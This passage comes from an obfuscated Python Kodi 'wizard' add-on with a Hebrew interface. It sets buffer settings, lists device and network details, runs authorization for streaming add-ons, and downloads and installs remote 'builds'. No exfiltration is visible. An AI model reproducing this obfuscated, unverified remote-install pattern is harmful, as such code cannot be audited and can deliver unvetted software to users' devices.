			DIALOG .ok ('Buffer Size Set to: '+str (O00O0OOOOOO0OOO00 ),'Please restart Kodi for settings to apply.','')#line:1665
	elif OOOO0O00O00000000 ==0 :#line:1667
		O00O0OOOOOO0OOO00 =_O0OOO0O0OOO00O0OO (default =str (O00O0OOOOOO0OOO00 ),heading ="INPUT BUFFER SIZE")#line:1668
		with open (OO00O00O00OOO00OO ,"w")as O0OOOOOOOO0000O0O :#line:1669
			if OO000O0OOOOO0000O >=17 :OOO0O0000OOO0O0O0 =xml_data_advSettings_New (str (O00O0OOOOOO0OOO00 ))#line:1670
			else :OOO0O0000OOO0O0O0 =xml_data_advSettings_old (str (O00O0OOOOOO0OOO00 ))#line:1671
			O0OOOOOOOO0000O0O .write (OOO0O0000OOO0O0O0 )#line:1672
			DIALOG .ok ('Buffer Size Set to: '+str (O00O0OOOOOO0OOO00 ),'Please restart Kodi for settings to apply.','')#line:1673
def xml_data_advSettings_old (O0OOO00OO00O0000O ):#line:1674
	O0O00O0OO00O00000 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%O0OOO00OO00O0000O #line:1684
	return O0O00O0OO00O00000 #line:1685
def xml_data_advSettings_New (OOO0OO0O0000O0000 ):#line:1687
	OO00O00O0OOO000OO ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%OOO0OO0O0000O0000 #line:1699
	return OO00O00O0OOO000OO #line:1700
def write_ADV_SETTINGS_XML (O000O00OO000OOOOO ):#line:1701
    if not os .path .exists (xml_file ):#line:1702
        with open (xml_file ,"w")as O00OO00OOO0000000 :#line:1703
            O00OO00OOO0000000 .write (xml_data )#line:1704
def _O0OOO0O0OOO00O0OO (default ="",heading ="",hidden =False ):#line:1705
    ""#line:1706
    OO0OO0OO00O0O00OO =xbmc .Keyboard (default ,heading ,hidden )#line:1707
    OO0OO0OO00O0O00OO .doModal ()#line:1708
    if (OO0OO0OO00O0O00OO .isConfirmed ()):#line:1709
        return unicode (OO0OO0OO00O0O00OO .getText (),"utf-8")#line:1710
    return default #line:1711
def index ():#line:1713
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:1714
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:1715
	if AUTOUPDATE =='Yes':#line:1716
		if wiz .workingURL (WIZARDFILE )==True :#line:1717
			O0O0OOOO000000OOO =wiz .checkWizard ('version')#line:1718
			if O0O0OOOO000000OOO >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,O0O0OOOO000000OOO ),'wizardupdate',themeit =THEME2 )#line:1719
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1720
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1721
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1722
	if len (BUILDNAME )>0 :#line:1723
		OOOOO0O0OOO0OOOO0 =wiz .checkBuild (BUILDNAME ,'version')#line:1724
		OO00OO000OO0OO00O ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:1725
		if OOOOO0O0OOO0OOOO0 >BUILDVERSION :OO00OO000OO0OO00O ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(OO00OO000OO0OO00O ,OOOOO0O0OOO0OOOO0 )#line:1726
		addDir (OO00OO000OO0OO00O ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:1728
		try :#line:1730
		     OO0O00OOO0OO0000O =wiz .themeCount (BUILDNAME )#line:1731
		except :#line:1732
		   OO0O00OOO0OO0000O =False #line:1733
		if not OO0O00OOO0OO0000O ==False :#line:1734
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:1735
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:1736
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:1739
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:1740
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1741
	addFile ('אימות חשבון','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:1745
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:1747
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:1749
def morsetup ():#line:1751
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:1752
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:1753
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:1754
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:1758
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:1759
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:1762
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:1763
	addFile ('הגדר מצב RD','rdon',icon =ICONMAINT ,themeit =THEME1 )#line:1764
	addFile ('ביטול מצב RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:1765
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:1773
	setView ('files','viewType')#line:1774
def morsetup2 ():#line:1775
	addFile ('מתקין ומגדיר','',themeit =THEME3 )#line:1776
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:1777
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:1778
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:1779
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:1780
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:1781
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:1782
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:1783
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:1784
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:1785
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:1786
def fastupdate ():#line:1787
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:1788
def forcefastupdate ():#line:1790
			O00OOOO0O000OO00O ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:1791
			wiz .ForceFastUpDate (ADDONTITLE ,O00OOOO0O000OO00O )#line:1792
def rdsetup ():#line:1796
	if not xbmc .getCondVisibility ('System.HasAddon(script.module.resolveurl)'):#line:1797
		xbmc .executebuiltin ("InstallAddon(script.module.resolveurl)")#line:1798
	if not xbmc .getCondVisibility ('System.HasAddon(script.module.urlresolver)'):#line:1799
		xbmc .executebuiltin ("InstallAddon(script.module.urlresolver)")#line:1800
	addFile ('[COLOR red]ResolverUrl[/COLOR] [COLOR gold]Real-Debrid Authorization[/COLOR]','resolveurl',fanart =FANART ,icon =ICONSAVE ,themeit =THEME2 )#line:1801
	addFile ('[COLOR blue]URLResolver[/COLOR] [COLOR gold]Real-Debrid Authorization[/COLOR]','urlresolver',fanart =FANART ,icon =ICONSAVE ,themeit =THEME2 )#line:1802
	setView ('files','viewType')#line:1803
def traktsetup ():#line:1805
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1806
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1807
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1808
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1809
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1810
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1811
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1812
	setView ('files','viewType')#line:1813
def resolveurlsetup ():#line:1815
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:1816
def urlresolversetup ():#line:1817
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:1818
def placentasetup ():#line:1820
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:1821
def reptiliasetup ():#line:1822
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:1823
def flixnetsetup ():#line:1824
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:1825
def yodasetup ():#line:1826
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:1827
def numberssetup ():#line:1828
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:1829
def uranussetup ():#line:1830
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:1831
def genesissetup ():#line:1832
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:1833
def net_tools (view =None ):#line:1835
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:1836
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1837
	setView ('files','viewType')#line:1839
def speedMenu ():#line:1840
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.mediacenter/speedtest.py")')#line:1841
def viewIP ():#line:1842
	O0000OO0OOOOO00O0 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:1856
	O0000O0O0OO0OO00O =[];O000OOOO000O0OOOO =0 #line:1857
	for O00OO0OOOOO0O0OO0 in O0000OO0OOOOO00O0 :#line:1858
		O00000OOOOOO00O00 =wiz .getInfo (O00OO0OOOOO0O0OO0 )#line:1859
		OOOOOOOOOO0OOO00O =0 #line:1860
		while O00000OOOOOO00O00 =="Busy"and OOOOOOOOOO0OOO00O <10 :#line:1861
			O00000OOOOOO00O00 =wiz .getInfo (O00OO0OOOOO0O0OO0 );OOOOOOOOOO0OOO00O +=1 ;wiz .log ("%s sleep %s"%(O00OO0OOOOO0O0OO0 ,str (OOOOOOOOOO0OOO00O )));xbmc .sleep (1000 )#line:1862
		O0000O0O0OO0OO00O .append (O00000OOOOOO00O00 )#line:1863
		O000OOOO000O0OOOO +=1 #line:1864
	OOOOOOO0O000OOOO0 ,O0O0O0O000OOO0OO0 ,OOOOOO00O0O00OOO0 =getIP ()#line:1865
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000O0O0OO0OO00O [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:1866
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOOOO0O000OOOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1867
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0O0O000OOO0OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1868
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOOO00O0O00OOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1869
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000O0O0OO0OO00O [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:1870
	setView ('files','viewType')#line:1871
def buildMenu ():#line:1873
	if USERNAME =='':#line:1874
		ADDON .openSettings ()#line:1875
		sys .exit ()#line:1876
	if PASSWORD =='':#line:1877
		ADDON .openSettings ()#line:1878
	OOO0O0OOOO0000OOO =u_list (SPEEDFILE )#line:1879
	(OOO0O0OOOO0000OOO )#line:1880
	O000OOO0O00OO000O =(wiz .workingURL (OOO0O0OOOO0000OOO ))#line:1881
	(O000OOO0O00OO000O )#line:1882
	O000OOO0O00OO000O =wiz .workingURL (SPEEDFILE )#line:1883
	if not O000OOO0O00OO000O ==True :#line:1884
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:1885
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:1886
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1887
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:1888
		addFile ('%s'%O000OOO0O00OO000O ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:1889
	else :#line:1890
		OOOO00O0O00000O0O ,OO00O0OO000O0000O ,OOO00000OOOOO0O00 ,OO000OOO0O0OOO0O0 ,OO00OO000000O0OOO ,O0OOOO0OOOO000O0O ,OOO000O0OOO0000O0 =wiz .buildCount ()#line:1891
		O000OO0OO00000OO0 =False ;OO0O0O0O00OO00O0O =[]#line:1892
		if THIRDPARTY =='true':#line:1893
			if not THIRD1NAME ==''and not THIRD1URL =='':O000OO0OO00000OO0 =True ;OO0O0O0O00OO00O0O .append ('1')#line:1894
			if not THIRD2NAME ==''and not THIRD2URL =='':O000OO0OO00000OO0 =True ;OO0O0O0O00OO00O0O .append ('2')#line:1895
			if not THIRD3NAME ==''and not THIRD3URL =='':O000OO0OO00000OO0 =True ;OO0O0O0O00OO00O0O .append ('3')#line:1896
		OOOOO0OOO0OOOOO00 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:1897
		O0OO00O0OOO0OOO00 =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOOOO0OOO0OOOOO00 )#line:1898
		if OOOO00O0O00000O0O ==1 and O000OO0OO00000OO0 ==False :#line:1899
			for O0000O0O00000OOOO ,O000O00O00OOO000O ,OOO00O0OOO00000O0 ,O0OO0OO0000O0OOOO ,OO0O0O0OOOO0OO0OO ,O00OO0OO00000OOOO ,O0000O0000OOOO0OO ,O00OO0O0OO00OOOO0 ,O0OO0O0OO0O0OOOOO ,OO0O0OO00OO00OOO0 in O0OO00O0OOO0OOO00 :#line:1900
				if not SHOWADULT =='true'and O0OO0O0OO0O0OOOOO .lower ()=='yes':continue #line:1901
				if not DEVELOPER =='true'and wiz .strTest (O0000O0O00000OOOO ):continue #line:1902
				viewBuild (O0OO00O0OOO0OOO00 [0 ][0 ])#line:1903
				return #line:1904
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:1907
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1908
		if O000OO0OO00000OO0 ==True :#line:1909
			for O00000O00OOOO0O00 in OO0O0O0O00OO00O0O :#line:1910
				O0000O0O00000OOOO =eval ('THIRD%sNAME'%O00000O00OOOO0O00 )#line:1911
		if len (O0OO00O0OOO0OOO00 )>=1 :#line:1913
			if SEPERATE =='true':#line:1914
				for O0000O0O00000OOOO ,O000O00O00OOO000O ,OOO00O0OOO00000O0 ,O0OO0OO0000O0OOOO ,OO0O0O0OOOO0OO0OO ,O00OO0OO00000OOOO ,O0000O0000OOOO0OO ,O00OO0O0OO00OOOO0 ,O0OO0O0OO0O0OOOOO ,OO0O0OO00OO00OOO0 in O0OO00O0OOO0OOO00 :#line:1915
					if not SHOWADULT =='true'and O0OO0O0OO0O0OOOOO .lower ()=='yes':continue #line:1916
					if not DEVELOPER =='true'and wiz .strTest (O0000O0O00000OOOO ):continue #line:1917
					OOO0O0000OO000OO0 =createMenu ('install','',O0000O0O00000OOOO )#line:1918
					addDir ('[%s] %s (v%s)'%(float (OO0O0O0OOOO0OO0OO ),O0000O0O00000OOOO ,O000O00O00OOO000O ),'viewbuild',O0000O0O00000OOOO ,description =OO0O0OO00OO00OOO0 ,fanart =O00OO0O0OO00OOOO0 ,icon =O0000O0000OOOO0OO ,menu =OOO0O0000OO000OO0 ,themeit =THEME2 )#line:1919
			else :#line:1920
				if OO000OOO0O0OOO0O0 >0 :#line:1921
					O0OO00O0O0O000000 ='+'if SHOW17 =='false'else '-'#line:1922
					if SHOW17 =='true':#line:1924
						for O0000O0O00000OOOO ,O000O00O00OOO000O ,OOO00O0OOO00000O0 ,O0OO0OO0000O0OOOO ,OO0O0O0OOOO0OO0OO ,O00OO0OO00000OOOO ,O0000O0000OOOO0OO ,O00OO0O0OO00OOOO0 ,O0OO0O0OO0O0OOOOO ,OO0O0OO00OO00OOO0 in O0OO00O0OOO0OOO00 :#line:1926
							if not SHOWADULT =='true'and O0OO0O0OO0O0OOOOO .lower ()=='yes':continue #line:1927
							if not DEVELOPER =='true'and wiz .strTest (O0000O0O00000OOOO ):continue #line:1928
							O00OO0O0O0O0O00O0 =int (float (OO0O0O0OOOO0OO0OO ))#line:1929
							if O00OO0O0O0O0O00O0 ==17 :#line:1930
								OOO0O0000OO000OO0 =createMenu ('install','',O0000O0O00000OOOO )#line:1931
								addDir ('[%s] %s (v%s)'%(float (OO0O0O0OOOO0OO0OO ),O0000O0O00000OOOO ,O000O00O00OOO000O ),'viewbuild',O0000O0O00000OOOO ,description =OO0O0OO00OO00OOO0 ,fanart =O00OO0O0OO00OOOO0 ,icon =O0000O0000OOOO0OO ,menu =OOO0O0000OO000OO0 ,themeit =THEME2 )#line:1932
				if OO00OO000000O0OOO >0 :#line:1933
					O0OO00O0O0O000000 ='+'if SHOW18 =='false'else '-'#line:1934
					if SHOW18 =='true':#line:1936
						for O0000O0O00000OOOO ,O000O00O00OOO000O ,OOO00O0OOO00000O0 ,O0OO0OO0000O0OOOO ,OO0O0O0OOOO0OO0OO ,O00OO0OO00000OOOO ,O0000O0000OOOO0OO ,O00OO0O0OO00OOOO0 ,O0OO0O0OO0O0OOOOO ,OO0O0OO00OO00OOO0 in O0OO00O0OOO0OOO00 :#line:1938
							if not SHOWADULT =='true'and O0OO0O0OO0O0OOOOO .lower ()=='yes':continue #line:1939
							if not DEVELOPER =='true'and wiz .strTest (O0000O0O00000OOOO ):continue #line:1940
							O00OO0O0O0O0O00O0 =int (float (OO0O0O0OOOO0OO0OO ))#line:1941
							if O00OO0O0O0O0O00O0 ==18 :#line:1942
								OOO0O0000OO000OO0 =createMenu ('install','',O0000O0O00000OOOO )#line:1943
								addDir ('[%s] %s (v%s)'%(float (OO0O0O0OOOO0OO0OO ),O0000O0O00000OOOO ,O000O00O00OOO000O ),'viewbuild',O0000O0O00000OOOO ,description =OO0O0OO00OO00OOO0 ,fanart =O00OO0O0OO00OOOO0 ,icon =O0000O0000OOOO0OO ,menu =OOO0O0000OO000OO0 ,themeit =THEME2 )#line:1944
				if OOO00000OOOOO0O00 >0 :#line:1945
					O0OO00O0O0O000000 ='+'if SHOW16 =='false'else '-'#line:1946
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(O0OO00O0O0O000000 ,OOO00000OOOOO0O00 ),'togglesetting','show16',themeit =THEME3 )#line:1947
					if SHOW16 =='true':#line:1948
						for O0000O0O00000OOOO ,O000O00O00OOO000O ,OOO00O0OOO00000O0 ,O0OO0OO0000O0OOOO ,OO0O0O0OOOO0OO0OO ,O00OO0OO00000OOOO ,O0000O0000OOOO0OO ,O00OO0O0OO00OOOO0 ,O0OO0O0OO0O0OOOOO ,OO0O0OO00OO00OOO0 in O0OO00O0OOO0OOO00 :#line:1949
							if not SHOWADULT =='true'and O0OO0O0OO0O0OOOOO .lower ()=='yes':continue #line:1950
							if not DEVELOPER =='true'and wiz .strTest (O0000O0O00000OOOO ):continue #line:1951
							O00OO0O0O0O0O00O0 =int (float (OO0O0O0OOOO0OO0OO ))#line:1952
							if O00OO0O0O0O0O00O0 ==16 :#line:1953
								OOO0O0000OO000OO0 =createMenu ('install','',O0000O0O00000OOOO )#line:1954
								addDir ('[%s] %s (v%s)'%(float (OO0O0O0OOOO0OO0OO ),O0000O0O00000OOOO ,O000O00O00OOO000O ),'viewbuild',O0000O0O00000OOOO ,description =OO0O0OO00OO00OOO0 ,fanart =O00OO0O0OO00OOOO0 ,icon =O0000O0000OOOO0OO ,menu =OOO0O0000OO000OO0 ,themeit =THEME2 )#line:1955
				if OO00O0OO000O0000O >0 :#line:1956
					O0OO00O0O0O000000 ='+'if SHOW15 =='false'else '-'#line:1957
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(O0OO00O0O0O000000 ,OO00O0OO000O0000O ),'togglesetting','show15',themeit =THEME3 )#line:1958
					if SHOW15 =='true':#line:1959
						for O0000O0O00000OOOO ,O000O00O00OOO000O ,OOO00O0OOO00000O0 ,O0OO0OO0000O0OOOO ,OO0O0O0OOOO0OO0OO ,O00OO0OO00000OOOO ,O0000O0000OOOO0OO ,O00OO0O0OO00OOOO0 ,O0OO0O0OO0O0OOOOO ,OO0O0OO00OO00OOO0 in O0OO00O0OOO0OOO00 :#line:1960
							if not SHOWADULT =='true'and O0OO0O0OO0O0OOOOO .lower ()=='yes':continue #line:1961
							if not DEVELOPER =='true'and wiz .strTest (O0000O0O00000OOOO ):continue #line:1962
							O00OO0O0O0O0O00O0 =int (float (OO0O0O0OOOO0OO0OO ))#line:1963
							if O00OO0O0O0O0O00O0 <=15 :#line:1964
								OOO0O0000OO000OO0 =createMenu ('install','',O0000O0O00000OOOO )#line:1965
								addDir ('[%s] %s (v%s)'%(float (OO0O0O0OOOO0OO0OO ),O0000O0O00000OOOO ,O000O00O00OOO000O ),'viewbuild',O0000O0O00000OOOO ,description =OO0O0OO00OO00OOO0 ,fanart =O00OO0O0OO00OOOO0 ,icon =O0000O0000OOOO0OO ,menu =OOO0O0000OO000OO0 ,themeit =THEME2 )#line:1966
		elif OOO000O0OOO0000O0 >0 :#line:1967
			if O0OOOO0OOOO000O0O >0 :#line:1968
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:1969
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:1970
			else :#line:1971
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:1972
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:1973
	setView ('files','viewType')#line:1974
def viewBuild (O0O00O0OO00OO0OO0 ):#line:1976
	O0O00O00O000000O0 =wiz .workingURL (SPEEDFILE )#line:1977
	if not O0O00O00O000000O0 ==True :#line:1978
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:1979
		addFile ('%s'%O0O00O00O000000O0 ,'',themeit =THEME3 )#line:1980
		return #line:1981
	if wiz .checkBuild (O0O00O0OO00OO0OO0 ,'version')==False :#line:1982
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:1983
		addFile ('%s was not found in the builds list.'%O0O00O0OO00OO0OO0 ,'',themeit =THEME3 )#line:1984
		return #line:1985
	OOOOO0OOOOO00O000 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:1986
	O00O0O00O0O00OOO0 =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O0O00O0OO00OO0OO0 ).findall (OOOOO0OOOOO00O000 )#line:1987
	for OOOO0OO0OOO0O0O0O ,OOO0OOOO0O00OO0OO ,OOOOOO00O0O0OOO0O ,O0OO0000O0O0O00OO ,OOO0O0OO0OO00OOO0 ,OOOOO0000O0OO0OOO ,OOO0O0O00000O0O0O ,OO0O00OOOO0000OO0 ,OO000O0000O000OO0 ,OO00OO0O000OOO0OO in O00O0O00O0O00OOO0 :#line:1988
		OOOOO0000O0OO0OOO =OOOOO0000O0OO0OOO if wiz .workingURL (OOOOO0000O0OO0OOO )else ICON #line:1989
		OOO0O0O00000O0O0O =OOO0O0O00000O0O0O if wiz .workingURL (OOO0O0O00000O0O0O )else FANART #line:1990
		O0OO00000000OOOO0 ='%s (v%s)'%(O0O00O0OO00OO0OO0 ,OOOO0OO0OOO0O0O0O )#line:1991
		if BUILDNAME ==O0O00O0OO00OO0OO0 and OOOO0OO0OOO0O0O0O >BUILDVERSION :#line:1992
			O0OO00000000OOOO0 ='%s [COLOR red][CURRENT v%s][/COLOR]'%(O0OO00000000OOOO0 ,BUILDVERSION )#line:1993
		OOO0O000000OOOO00 =int (float (KODIV ));O0O0O0O0000OOOO0O =int (float (O0OO0000O0O0O00OO ))#line:2002
		if not OOO0O000000OOOO00 ==O0O0O0O0000OOOO0O :#line:2003
			if OOO0O000000OOOO00 ==16 and O0O0O0O0000OOOO0O <=15 :O000OO0O0O0OOOO0O =False #line:2004
			else :O000OO0O0O0OOOO0O =True #line:2005
		else :O000OO0O0O0OOOO0O =False #line:2006
		addFile ('התקנה','install',O0O00O0OO00OO0OO0 ,'fresh',description =OO00OO0O000OOO0OO ,fanart =OOO0O0O00000O0O0O ,icon =OOOOO0000O0OO0OOO ,themeit =THEME1 )#line:2010
		if not OOO0O0OO0OO00OOO0 =='http://':#line:2013
			if wiz .workingURL (OOO0O0OO0OO00OOO0 )==True :#line:2014
				addFile (wiz .sep ('THEMES'),'',fanart =OOO0O0O00000O0O0O ,icon =OOOOO0000O0OO0OOO ,themeit =THEME3 )#line:2015
				OOOOO0OOOOO00O000 =wiz .openURL (OOO0O0OO0OO00OOO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2016
				O00O0O00O0O00OOO0 =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOOOO0OOOOO00O000 )#line:2017
				for O00O0000OOOOO0000 ,OO0O000O0O0O00O00 ,O000000O00OOO0OOO ,O00O000O0O0OOO00O ,O0OOOO0O00OOO0OO0 ,OO00OO0O000OOO0OO in O00O0O00O0O00OOO0 :#line:2018
					if not SHOWADULT =='true'and O0OOOO0O00OOO0OO0 .lower ()=='yes':continue #line:2019
					O000000O00OOO0OOO =O000000O00OOO0OOO if O000000O00OOO0OOO =='http://'else OOOOO0000O0OO0OOO #line:2020
					O00O000O0O0OOO00O =O00O000O0O0OOO00O if O00O000O0O0OOO00O =='http://'else OOO0O0O00000O0O0O #line:2021
					addFile (O00O0000OOOOO0000 if not O00O0000OOOOO0000 ==BUILDTHEME else "[B]%s (Installed)[/B]"%O00O0000OOOOO0000 ,'theme',O0O00O0OO00OO0OO0 ,O00O0000OOOOO0000 ,description =OO00OO0O000OOO0OO ,fanart =O00O000O0O0OOO00O ,icon =O000000O00OOO0OOO ,themeit =THEME3 )#line:2022
	setView ('files','viewType')#line:2023
def viewThirdList (O0O000O0OOO00OOOO ):#line:2025
	OOO00O0OO0O0OO0OO =eval ('THIRD%sNAME'%O0O000O0OOO00OOOO )#line:2026
	OO00OO0O0OO0O00OO =eval ('THIRD%sURL'%O0O000O0OOO00OOOO )#line:2027
	O0O00000OO0O00O0O =wiz .workingURL (OO00OO0O0OO0O00OO )#line:2028
